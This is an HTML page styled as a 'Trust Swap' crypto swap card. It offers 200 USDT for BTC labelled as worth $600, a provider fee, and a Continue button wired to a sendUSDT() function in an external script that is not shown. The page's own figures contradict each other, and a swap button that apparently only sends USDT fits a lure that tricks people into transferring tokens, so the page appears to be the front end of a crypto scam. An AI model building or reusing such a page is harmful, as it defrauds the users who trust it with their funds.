<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Trust Swap UI</title>
  <link rel="stylesheet" href="style.css" />
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
</head>
<body>
  <div class="card">
    <h2>Swap</h2>

    <!-- From Section -->
    <div class="swap-box">
      <div class="swap-row">
        <div class="token-info">
          <img
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6CAMAAADv+/57AAAAFVBMVEUAAAD///8ZGRn7+/v19fXx8fGjo6OysrJiYmJh1roSAAABuUlEQVR4nO3XsQ2AIBAF0cT+/zOYDY9uMqGmINnnOeQqYzN57Xb5PfN1G+9wA8AzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAczG7h36Sn3ZtxXQAAAABJRU5ErkJggg=="
            alt="USDT"
            class="token-logo"
          />
          <div>
            <div class="token-name">USDT</div>
            <div class="token-chain">BNB Smart Chain</div>
          </div>
        </div>
        <div class="token-value">
          <div class="token-amount">200</div>
          <div class="token-usd">$200.09</div>
        </div>
      </div>
    </div>

    <!-- To Section -->
    <div class="swap-box">
      <div class="swap-row">
        <div class="token-info">
          <img
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6CAMAAADv+/57AAAAFVBMVEUAAACZmZn///+ZmZl/f3+ZmZn6+vqZmZn6kWTGAAABeElEQVR4nO3TQQqAMAxDUT3/5rO6Rh3jQdAfKYiCj1kQmE4tZJrPzMcx6QDwD+Ac4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAc4BzgHOAfJBe4R1MUMAmwAAAABJRU5ErkJggg=="
            alt="BTC"
            class="token-logo"
          />
          <div>
            <div class="token-name">BTC</div>
            <div class="token-chain">Bitcoin</div>
          </div>
        </div>
        <div class="token-value">
          <div class="token-amount">0.00506297</div>
          <div class="token-usd">$600.00 <span class="percent-loss">(-1%)</span></div>
        </div>
      </div>
      <div class="exchange-rate">1 BTC ≈ 1,19,489.153599 USDT ↔</div>
    </div>

    <!-- Provider Section -->
    <div class="swap-box">
      <div class="swap-row">
        <div>Provider Fee</div>
        <div class="token-value">
          <div>$0.50</div>
          <div class="token-usd">0.00063 BNB</div>
        </div>
      </div>
      <div class="swap-row">
        <div>Provider</div>
        <div>Binance</div>
      </div>
    </div>

    <!-- Continue Button -->
    <button onclick="sendUSDT()">Continue</button>
  </div>

  <script src="script.js"></script>
</body>
</html>
